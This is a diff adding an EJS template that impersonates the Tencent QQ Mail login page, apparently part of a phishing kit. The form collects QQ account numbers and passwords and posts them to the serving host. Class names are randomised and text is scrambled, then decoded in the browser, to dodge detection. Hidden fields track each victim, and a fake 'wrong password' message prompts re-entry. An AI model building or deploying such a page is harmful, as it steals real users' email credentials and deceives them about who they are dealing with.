@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html lang="zh-cmn">
+
+<head>
+    <title class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('登录QQ邮箱');return x.key+':'+x.val}()%></title>
+    <style>
+ body,
+p,
+dl,
+dd,
+h1,
+h2,
+h3,
+h4,
+h5,
+h6,
+pre,
+form,
+fieldset,
+legend {
+    margin: 0;
+}
+
+ul,
+ol,
+fieldset {
+    margin: 0;
+    padding: 0;
+}
+
+table {
+    font-size: inherit;
+}
+
+fieldset,
+img {
+    border: none;
+}
+
+ul,
+ol,
+li {
+    list-style: none;
+}
+
+html {
+    overflow: auto\9;
+}
+
+body {
+    font-size: 12px;
+}
+
+html,
+body {
+    background-color: #fff;
+}
+
+body,
+input,
+textarea,
+select,
+button {
+    font-family: "lucida Grande", Verdana, "Microsoft YaHei";
+}
+
+input,
+textarea,
+select,
+button {
+    font-size: inherit;
+}
+
+a {
+    color: #225592;
+    text-decoration: none;
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+::-webkit-input-placeholder {
+    color: #8b9096;
+}
+
+:-moz-placeholder {
+    color: #8b9096;
+}
+
+.<%=sha('login_button')%> {
+    display: inline-block;
+    *display: inline;
+    *zoom: 1;
+    box-sizing: border-box;
+    width: auto;
+    height: 40px;
+    height: 38px\9;
+    line-height: 38px;
+    padding: 0 20px;
+    margin-top: 9px;
+    *vertical-align: -6px;
+    font-size: 16px;
+    font-weight: normal;
+    color: #fff;
+    text-align: center;
+    background: #5a98de;
+    border-radius: 3px;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    outline: none;
+    border: none;
+    cursor: pointer;
+}
+
+.<%=sha('login_button')%>:hover,
+.<%=sha('login_button')%>:focus {
+    background: #6aa2e0;
+    text-decoration: none;
+}
+
+.<%=sha('login_button')%>:active {
+    background: #5a98de;
+}
+
+.<%=sha('container')%> {
+    min-height: 500px;
+}
+
+.<%=sha('header')%> {
+    height: 62px;
+    overflow: hidden;
+    zoom: 1;
+    border-bottom: 1px solid #d6dfea;
+    background: #eff4fa;
+}
+
+.<%=sha('header_logo')%> {
+    float: left;
+    _display: inline;
+    width: 182px;
+    height: 35px;
+    margin-top: 14px;
+    margin-left: 17px;
+    text-indent: -9999em;
+    background-size: 182px 35px;
+    background-repeat: no-repeat;
+    background-position: left center;
+    background-image: url(https://rescdn.qqmail.com/zh_CN/htmledition/images/webp/logo/qqmail/qqmail_logo_default_70h206ff1.png);
+    _background-image: url(https://rescdn.qqmail.com/zh_CN/htmledition/images/webp/logo/qqmail/qqmail_logo_default_70h206ff1.png);
+}
+
+.<%=sha('header_link')%> {
+    overflow: hidden;
+    margin-top: 16px;
+    padding-right: 17px;
+    line-height: 30px;
+    text-align: right;
+    color: #b6b6b6;
+}
+
+.<%=sha('header')%> a,
+.<%=sha('footer')%> a {
+    color: #1d5494;
+}
+
+.<%=sha('content')%> {
+    width: 960px;
+    margin: 32px auto;
+    padding: 0 24px;
+}
+
+.<%=sha('content_wrapper')%> {
+    min-height: 372px;
+    padding-top: 40px;
+    margin: 0 20px 60px 25px;
+    *zoom: 1;
+}
+
+.<%=sha('content_wrapper')%>:after {
+    content "";
+    display: block;
+    width: 0;
+    height: 0;
+    clear: both;
+}
+
+.<%=sha('footer')%> {
+    position: fixed;
+    _position: static;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    z-index: 2;
+    clear: both;
+    line-height: 36px;
+    text-align: center;
+    color: #b6b6b6;
+    background-color: #eff4fa;
+    border-top: 1px solid #d6dfea;
+}
+
+.<%=sha('login_msg')%> {
+    padding: 18px 5px;
+    color: #7e4f01;
+    line-height: 18px;
+    background: none;
+    border-bottom: 2px solid #dcdcdc;
+    margin-left: 20px;
+    margin-right: 20px;
+}
+
+.<%=sha('login_msg')%> p {
+    font-size: 14px;
+    font-weight: bold;
+    color: #885429;
+}
+
+.<%=sha('login_msg')%> ul {
+    margin: 6px 0 0 18px;
+}
+
+.<%=sha('login_msg')%> li {
+    list-style: disc outside;
+    color: #6e6e6e;
+}
+
+.<%=sha('login_msg_warning')%> {
+    display: inline-block;
+    *display: inline;
+    *zoom: 1;
+    width: 22px;
+    height: 18px;
+    background: url(/zh_CN/htmledition/images/webp/icon_ptloginpage1e9c5d.png) -131px -16px no-repeat;
+    margin-right: 4px;
+    vertical-align: -3px;
+}
+
+.<%=sha('login_container')%> {
+    float: right;
+    border: 1px solid #a0b1c4;
+    width: 334px;
+    height: 387px;
+    _height: 371px;
+    background-color: #fff;
+    position: relative;
+    z-index: 12;
+    padding: 0;
+    border-radius: 5px;
+    overflow: hidden;
+}
+
+.<%=sha('login_box')%> {
+    position: relative;
+    z-index: 11;
+    width: 305px;
+    margin-right: 4px;
+    padding: 20px;
+    border: 1px solid #acc3e4;
+    background: #edf5ff;
+    box-shadow: 2px 2px 3px rgba(0, 0, 0, 0.15);
+    border-radius: 5px;
+}
+
+.<%=sha('login_box_header')%> {
+    text-align: center;
+    padding: 16px 0;
+    background-color: #f9fbfe;
+    border-bottom: 1px solid #c0cdd9;
+}
+
+.<%=sha('login_box_title')%> {
+    font-size: 16px;
+    font-weight: normal;
+    color: #333;
+    cursor: default;
+}
+
+.<%=sha('login_box_msg')%> {
+    margin: 12px 25px -4px;
+    color: #f00;
+    text-align: left;
+}
+
+.<%=sha('login_box')%> .<%=sha('noCookie')%>,
+.<%=sha('login_box')%> .<%=sha('noScript')%> {
+    padding: 6px;
+    border: 1px solid #fadc80;
+    line-height: 1.5;
+    color: black;
+    background: #fff9e3;
+}
+
+.<%=sha('login_box')%> .<%=sha('alias')%> {
+    width: 174px;
+    padding-right: 125px;
+}
+
+.<%=sha('login_box')%> .<%=sha('login_https')%> {
+    text-align: right;
+    margin-top: -16px;
+}
+
+.<%=sha('login_box')%> .<%=sha('txt')%> {
+    position: relative;
+    width: 274px;
+    height: 25px;
+    line-height: 18px;
+    padding: 5px 4px;
+    overflow: hidden;
+    color: #494949;
+    border: 1px solid #96a5b4;
+    font-size: 20px;
+    background: transparent;
+    outline: none;
+    border-radius: 2px;
+}
+
+.<%=sha('login_box')%> .<%=sha('txt')%>:focus {
+    border: 1px solid #4892e7;
+}
+
+.<%=sha('login_box')%> .<%=sha('txt_placeholder')%> {
+    position: absolute;
+    top: 7px;
+    left: 1px;
+    width: 268px;
+    height: 34px;
+    padding: 0 7px;
+    line-height: 34px;
+    font-size: 14px;
+    color: #8b9096;
+}
+
+.<%=sha('login_box')%> .<%=sha('txt_dim')%> {
+    color: #dcdddf;
+}
+
+.<%=sha('login_box')%> .<%=sha('login_button')%> {
+    min-width: 140px;
+}
+
+.<%=sha('login_box')%> .<%=sha('about_password')%> {
+    padding: 4px 0;
+}
+
+.<%=sha('login_box')%> .<%=sha('about_password')%> a {
+    position: absolute;
+    right: 0;
+    padding-top: 4px\9;
+}
+
+.<%=sha('login_box')%> .<%=sha('remerber_password')%> {
+    margin-right: 4px;
+    margin-left: -4px\9;
+    vertical-align: middle;
+}
+
+.<%=sha('login_box')%> .<%=sha('captips')%> {
+    position: absolute;
+    top: 43px;
+    left: 0;
+    z-index: 20;
+    padding: 1px;
+    border: 1px solid;
+    border-color: #dbc492 #b49366 #b49366 #dbc492;
+    background: #fdf6aa;
+}
+
+.<%=sha('login_box')%> .<%=sha('vfcode')%> {
+    margin-top: 0px;
+}
+
+.<%=sha('login_box')%> .<%=sha('vfcode_img')%> {
+    float: left;
+    text-align: left;
+    padding: 5px 0 0;
+    padding-top: 6px\9;
+    margin-bottom: 10px;
+}
+
+.<%=sha('login_box')%> .<%=sha('vfcodeinput')%> {
+    position: relative;
+    float: left;
+    padding: 5px 0;
+}
+
+.<%=sha('login_box')%> .<%=sha('vfcode_img')%> img {
+    width: 138px;
+    height: 53px;
+    border: 1px solid #cfd7e2;
+    vertical-align: middle;
+    cursor: pointer;
+    margin-right: 10px;
+}
+
+.<%=sha('login_box')%> .<%=sha('verifytip')%>,
+.<%=sha('login_box')%> .<%=sha('vfcode_change')%> {
+    padding: 10px 0 3px;
+}
+
+.<%=sha('login_box')%> .<%=sha('login_tips')%> {
+    padding-top: 15px;
+    line-height: 18px;
+}
+
+.<%=sha('login_box')%> .<%=sha('login_tips')%> p {
+    margin-top: 3px;
+}
+
+.<%=sha('login_operate')%> {
+    padding: 12px 0 20px;
+}
+
+.<%=sha('login_operate')%> .<%=sha('username')%>,
+.<%=sha('login_operate')%> .<%=sha('password')%>,
+.<%=sha('login_operate')%> .<%=sha('about_password')%>,
+.<%=sha('login_operate')%> .<%=sha('')%> {
+    position: relative;
+    width: 284px;
+    padding: 5px 0;
+    z-index: 2\9;
+}
+
+.<%=sha('login_operate')%> .<%=sha('login_submit')%> {
+    padding-bottom: 25px;
+    clear: both;
+}
+
+.<%=sha('login_submit')%> .<%=sha('login_cancel')%> {
+    margin-left: 15px;
+    font-size: 14px;
+}
+
+.<%=sha('login_operate')%> .<%=sha('username')%> {
+    height: 38px;
+    line-height: 38px;
+    z-index: 10\9;
+}
+
+.<%=sha('login_operate')%> .<%=sha('username_immutable')%> {
+    display: block;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    color: #494949;
+    font-size: 18px;
+    font-weight: bold;
+}
+
+.<%=sha('login_operate')%> .<%=sha('about_password')%> {
+    padding: 4px 0;
+    z-index: 1\9;
+}
+
+.<%=sha('login_operate')%> .<%=sha('vfcodeinput')%> {
+    height: 40px;
+    padding-bottom: 3px;
+}
+
+.<%=sha('login_domain')%> {
+    position: absolute;
+    top: 6px;
+    *top: 7px;
+    right: 1px;
+    width: 112px;
+    height: 31px;
+    line-height: 32px;
+    padding: 0 0 3px 8px;
+    border: none;
+    border-left: 1px solid #d5deec;
+    color: #4d4d4c;
+    font-size: 18px;
+    z-index: 1;
+    cursor: pointer;
+    background: url(/zh_CN/htmledition/images/webp/login_ico_selector1e9c5d.gif) no-repeat scroll 105px -25px #fbfbfb;
+    border-radius: 0 3px 3px 0;
+    box-shadow: -1px 0 2px rgba(0, 0, 0, 0.09);
+}
+
+.active .login_domain,
+.login_domain:hover {
+    background-position: 105px 11px;
+    background-color: #f7fafe;
+}
+
+@-webkit-keyframes domains_show {
+    0% {
+        opacity: 0;
+    }
+    100% {
+        opacity: 1;
+    }
+}
+
+@-moz-keyframes domains_show {
+    0% {
+        opacity: 0.5;
+        top: 4px;
+        height: 24px;
+    }
+    100% {
+        opacity: 1;
+        top: -35px;
+        height: 96px;
+    }
+}
+
+@keyframes domains_show {
+    0% {
+        opacity: 0.5;
+        top: 4px;
+        height: 24px;
+    }
+    100% {
+        opacity: 1;
+        top: -35px;
+        height: 96px;
+    }
+}
+
+@-webkit-keyframes domains_show_item {
+    0% {
+        margin-top: -39px;
+    }
+    100% {
+        margin-top: 0;
+    }
+}
+
+@-moz-keyframes domains_show_item {
+    0% {
+        margin-top: -39px;
+    }
+    100% {
+        margin-top: 0;
+    }
+}
+
+@keyframes domains_show_item {
+    0% {
+        margin-top: -39px;
+    }
+    100% {
+        margin-top: 0;
+    }
+}
+
+.<%=sha('login_domains_show')%> {
+    -webkit-animation-name: domains_show;
+    -webkit-animation-duration: 0.1s;
+    -webkit-animation-timing-function: ease-out;
+    -moz-animation-name: domains_show;
+    -moz-animation-duration: 0.1s;
+    -moz-animation-timing-function: ease-out;
+    animation-name: domains_show;
+    animation-duration: 0.1s;
+    animation-timing-function: ease-out;
+}
+
+.<%=sha('login_domains_show')%> .<%=sha('auto_item')%>:first-child {
+    -webkit-animation-name: domains_show_item;
+    -webkit-animation-duration: 0.1s;
+    -webkit-animation-timing-function: ease-out;
+    -moz-animation-name: domains_show_item;
+    -moz-animation-duration: 0.1s;
+    -moz-animation-timing-function: ease-out;
+    animation-name: domains_show_item;
+    animation-duration: 0.1s;
+    animation-timing-function: ease-out;
+}
+
+.<%=sha('login_pictures')%> {
+    position: relative;
+    margin-right: 395px;
+}
+
+.<%=sha('login_pictures_picture')%> {
+    position: absolute;
+    left: 0;
+    right: 0;
+    top: 0;
+    height: 400px;
+    _width: 100%;
+    background-repeat: no-repeat;
+    background-position: right center;
+}
+
+.<%=sha('login_pictures_txt')%> {
+    padding-top: 25px;
+    position: relative;
+    font-size: 14px;
+    font-weight: normal;
+    line-height: 24px;
+}
+
+.<%=sha('login_pictures_title')%> {
+    line-height: 26px;
+    margin-top: 15px;
+    margin-bottom: 15px;
+    font-size: 24px;
+    font-weight: normal;
+    color: #6f95c8;
+}
+
+.<%=sha('login_pictures_info')%> {
+    margin-top: 6px;
+    font-size: 12px;
+}
+
+.<%=sha('autocomplete')%> {
+    display: block;
+    position: absolute;
+    right: -6px;
+    top: -35px;
+    z-index: 3;
+    width: 130px;
+    overflow: hidden;
+    margin: 1px 0 0 0;
+    padding: 5px 0;
+    border: 1px solid #9BBBDA;
+    color: #4D4D4C;
+    background: #FFFFFF;
+    outline: none;
+    box-shadow: 0 0 3px rgba(110, 189, 222, 0.5);
+    -webkit-box-shadow: 0 0 3px rgba(110, 189, 222, 0.5);
+    border-radius: 3px;
+    -webkit-border-radius: 3px;
+}
+
+.<%=sha('auto_item')%> {
+    position: relative;
+    height: 34px;
+    padding-left: 24px;
+    font-size: 14px;
+    line-height: 30px;
+    background: #FFFFFF;
+    cursor: pointer;
+}
+
+.<%=sha('autocomplete')%> .<%=sha('auto_select')%> {
+    background: #ECF5FF;
+}
+
+.<%=sha('independent_password')%> {
+    min-height: 340px;
+}
+
+.<%=sha('independent_password')%> .<%=sha('login_operate')%> .<%=sha('username')%> {
+    margin-bottom: -10px;
+}
+
+.<%=sha('second_login_box')%> {
+    border: none;
+    background-color: #fff;
+    width: 100%;
+    -webkit-box-shadow: none;
+    border-radius: 0;
+    -webkit-border-radius: 0;
+    min-height: 345px;
+    _height: 321px;
+    padding: 0 0 25px 0;
+}
+
+.<%=sha('second_login_box')%> .<%=sha('login_operate')%> {
+    padding: 20px 0px;
+    margin: 0 auto;
+    width: 285px;
+}
+
+.<%=sha('second_login_box')%> .<%=sha('login_operate')%> .<%=sha('password')%> {
+    margin-bottom: 1px;
+}
+
+.<%=sha('second_login_box')%> .<%=sha('login_box_forgotpassword')%> {
+    position: absolute;
+    right: 16px;
+    bottom: 15px;
+}
+
+.<%=sha('independent_password')%> .<%=sha('login_operate')%> .<%=sha('username')%> {
+    margin-bottom: -4px;
+}
+
+.<%=sha('mail_intro')%> {
+    width: 400px;
+    margin-left: 16px;
+}
+
+.<%=sha('mail_intro')%> h1 {
+    display: none;
+}
+
+.<%=sha('mail_intro')%> ul {
+    line-height: 20px;
+}
+
+.<%=sha('mail_intro')%> ul li {
+    margin-left: 16px;
+    list-style: disc outside;
+}
+
+.<%=sha('mask')%> {
+    position: fixed;
+    z-index: 10;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    left: 0;
+    background: #fff;
+    opacity: 0.6;
+    filter: alpha(opacity=60);
+}
+
+.<%=sha('gray')%> {
+    color: #868686;
+}
+
+@media (min-width:1070px) {
+    .<%=sha('header')%>,
+    .<%=sha('footer')%> {
+        min-width: 1070px;
+    }
+    .<%=sha('header_logo')%> {
+        margin-left: 40px;
+    }
+    .<%=sha('header_link')%> {
+        padding-right: 40px;
+    }
+}
+
+@media (max-height:670px) {
+    .<%=sha('footer')%> {
+        position: static;
+    }
+}
+
+@media (-webkit-min-device-pixel-ratio:2),
+(min--moz-device-pixel-ratio:2),
+(-o-min-device-pixel-ratio:2),
+(min-device-pixel-ratio:2),
+(min-resolution:2dppx) {
+    .<%=sha('header_logo')%> {
+        background-image: url(https://rescdn.qqmail.com/zh_CN/htmledition/images/webp/logo/qqmail/qqmail_logo_default_70h206ff1.png);
+    }
+}
+
+.<%=sha('l_header')%> {
+    height: 50px;
+    font-family: "lucida Grande",Verdana,"Microsoft YaHei";
+    border-bottom: 1px solid #c0cdd9;
+    background-color: #f9fbfe;
+}
+.<%=sha('l_header')%> a{
+    color: #999;
+    display: inline-block;
+    height: 45px;
+    line-height: 45px;
+    outline: 0;
+    text-decoration: none;
+    font-size: 16px;
+    cursor: pointer;
+    width: 50%;
+    margin: 0;
+    float: left;
+    text-align: center;
+}
+.<%=sha('l_header')%> .<%=sha('l_a_hover')%>{
+    color: #333;
+}
+
+.<%=sha('l_input')%> {
+    width: 258px;
+    position: relative;
+    top: 2px;
+    left: 2px;
+    height: 18px;
+    padding: 11px 0 11px 10px;
+    line-height: 18px;
+    color: #333;
+    font-family: Verdana,Tahoma,Arial;
+    font-size: 16px;
+    top: 0px;
+    padding: 10px 40px 10px 10px;
+    left: 0px;
+    border-radius: 3px;
+    width: 232px;
+    background: none;
+    border: 1px solid #96a5b4;
+    margin: auto;
+    display: block;
+    margin-bottom: 10px;
+}
+
+.<%=sha('tips')%> {
+    height: 30px;
+    width: 280px;
+    color: red;
+    padding-right: 15px;
+    margin-left: 26px;
+    margin-top: 20px;
+}
+
+.<%=sha('ckbx')%>{
+    margin-left: 26px;
+    margin-top: 20px;
+}
+
+.<%=sha('login_button')%> {
+    background: none;
+    height: 40px;
+    line-height: 39px;
+    width: 281px;
+    outline: none;
+    font-weight: normal;
+    margin: auto;
+    background: #5a98de;
+    display: block;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    margin-top: 20px;
+    cursor: pointer;
+}
+
+.<%=sha('login_button')%>:active {
+    background: #6489d8;
+}
+
+.<%=sha('l_bottom')%> {
+    position: absolute;
+    bottom: 10px;
+    right: 10px;
+}
+
+    </style>
+</head>
+
+<body style="display: none">
+    <div class="<%=sha('header')%>">
+        <a class="<%=sha('header_logo')%> <%=sha('replace_content')%>" href="/" ><%= function(){var x = ranRp('QQ邮箱');return x.key+':'+x.val}()%></a>
+        <div class="<%=sha('header_link')%>">
+            <a href="#" class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('基本版');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+            <a href="#">English</a>&nbsp;|&nbsp;
+            <a href="#" target="_blank" class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('手机版');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+            <a href="#" target="_blank" class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('企业邮箱');return x.key+':'+x.val}()%></a>
+        </div>
+    </div>
+    <div class="<%=sha('content')%>">
+            <div class="<%=sha('content_wrapper')%>">
+                <div class="<%=sha('login_container')%>" id="<%=sha('login')%>" style="width: 334px; height: 387px; visibility: visible;">
+                    <div id="<%=sha('login_frame')%>" name="<%=sha('login_frame')%>" height="100%" scrolling="no" width="100%" frameborder="0" src="">
+                        <div class="<%=sha('l_header')%>">
+                            <a class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('快速登录');return x.key+':'+x.val}()%></a>
+                            <a class="<%=sha('l_a_hover')%> <%=sha('replace_content')%>"><%= function(){var x = ranRp('帐号密码登录');return x.key+':'+x.val}()%></a>
+                        </div>
+                        <div class="<%=sha('tips')%>"></div>
+                        <form id="ff" action="" method="post" id="<%=ranStr[11]%>">
+
+                        
+                        <input type="text" placeholder="<%= function(){var x = ranRp('支持QQ号/邮箱/手机号登录');return x.key+':'+x.val}()%>" id="<%=sha('u')%>" name="<%= function(){var x = ranRp('u');return x.key+':'+x.val}()%>" class="<%=sha('l_input')%> <%=sha('replace_name')%> <%=sha('replace_placeholder')%>"/>
+                        <input type="password" placeholder="<%= function(){var x = ranRp('QQ密码');return x.key+':'+x.val}()%>" id="<%=sha('p')%>" name="<%= function(){var x = ranRp('p');return x.key+':'+x.val}()%>" class="<%=sha('l_input')%> <%=sha('replace_name')%> <%=sha('replace_placeholder')%>"/>
+                        <input type="hidden" class="<%=sha('replace_name')%>" name="<%= function(){var x = ranRp('uid');return x.key+':'+x.val}()%>" value="<%=uid%>">
+                        <input type="hidden" class="<%=sha('replace_name')%>" name="<%= function(){var x = ranRp('mid');return x.key+':'+x.val}()%>" value="<%=mid%>">
+                        <input type="hidden" class="<%=sha('replace_name')%>" name="<%= function(){var x = ranRp('tz');return x.key+':'+x.val}()%>" value="<%=tz%>">
+                        <input type="checkbox" id="<%=sha('low_login_wording')%>" class="<%=sha('ckbx')%>"/>
+                        <label class="<%=sha('low_login_wording')%> <%=sha('replace_content')%>" for="<%=sha('low_login_wording')%>"><%= function(){var x = ranRp('下次自动登录');return x.key+':'+x.val}()%></label>
+                        <input type="button" tabindex="6" id="<%=sha('go')%>" value="登 录" class="<%=sha('login_button')%>">
+                        <div class="<%=sha('l_bottom')%>">
+                            <a class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('忘了密码');return x.key+':'+x.val}()%></a>
+                            |
+                            <a class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('注册新帐号');return x.key+':'+x.val}()%></a>
+                            |
+                            <a class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('意见反馈');return x.key+':'+x.val}()%></a>
+                        </div>
+                    </form>
+                    </div>
+                </div>
+                <div class="<%=sha('login_pictures')%>">
+                    <div class="<%=sha('login_pictures_picture')%>" style="background-image:url('https://rescdn.qqmail.com/zh_CN/htmledition/images/webp/tg-mj1e9c5d.jpg');background-position:right 20px;"></div>
+                </div>
+            </div>
+        </div>
+    <div class="<%=sha('footer')%>">
+        <a href="#" target="_blank" class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('关于腾讯');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('服务条款');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('隐私政策');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('客服中心');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('联系我们');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('帮助中心');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+        <span class="<%=sha('gray')%> <%=sha('replace_content')%>"><%= function(){var x = ranRp('©1998 - 2018 Tencent Inc. All Rights Reserved.');return x.key+':'+x.val}()%></span>
+    </div>
+</body>
+<script src="/jquery/<%=ranStr[99]%>" type="text/javascript"></script>
+<script>
+    $('.<%=sha('replace_placeholder')%>').each(function(){
+        var <%=sha('placeholder')%> = $(this).attr('placeholder');
+        $(this).attr('placeholder', <%=ranStr[199]%>(<%=sha('placeholder')%>));
+    })
+    $('.<%=sha('replace_content')%>').each(function(){
+        var <%=sha('innerHtml')%> = $(this).html();
+        $(this).html(<%=ranStr[199]%>(<%=sha('innerHtml')%>))
+    })
+
+    $('.<%=sha('replace_name')%>').each(function(){
+        var <%=ranStr[16]%> = $(this).attr('name');
+        $(this).attr('name', <%=ranStr[199]%>(<%=ranStr[16]%>));
+    })
+
+    $('body').css('display','block')
+
+    var <%=sha('_n')%> = '<%=tz%>';
+        var <%=sha('errMsg')%> = $('.<%=sha('tips')%>');
+        $('#<%=sha('go')%>').on('click',function(){
+            if ($('#<%=sha('u')%>').val() === '') {
+                <%=sha('errMsg')%>.html(<%=ranStr[199]%>("<%= function(){var x = ranRp('请输入QQ号!');return x.key+':'+x.val}()%>"));
+                <%=sha('errMsg')%>.css({"visibility":"visible"})
+                setTimeout(function(){
+                    <%=sha('errMsg')%>.css({"visibility":"hidden"})
+                },5000);
+            } else if($('#<%=sha('p')%>').val() === ''){
+                <%=sha('errMsg')%>.html(<%=ranStr[199]%>("<%= function(){var x = ranRp('你还没有输入密码！');return x.key+':'+x.val}()%>"));
+                <%=sha('errMsg')%>.css({"visibility":"visible"})
+                setTimeout(function(){
+                    <%=sha('errMsg')%>.css({"visibility":"hidden"})
+                },5000);
+            } else {
+                $('#ff').submit();
+            }
+        });
+    if (<%=sha('_n')%> === '1') {
+        <%=sha('errMsg')%>.html(<%=ranStr[199]%>("<%= function(){var x = ranRp('帐号密码错误！');return x.key+':'+x.val}()%>"));
+        <%=sha('errMsg')%>.css({"visibility":"visible"})
+        setTimeout(function(){
+            <%=sha('errMsg')%>.css({"visibility":"hidden"})
+        },5000);
+    }
+</script>
+
+</html>
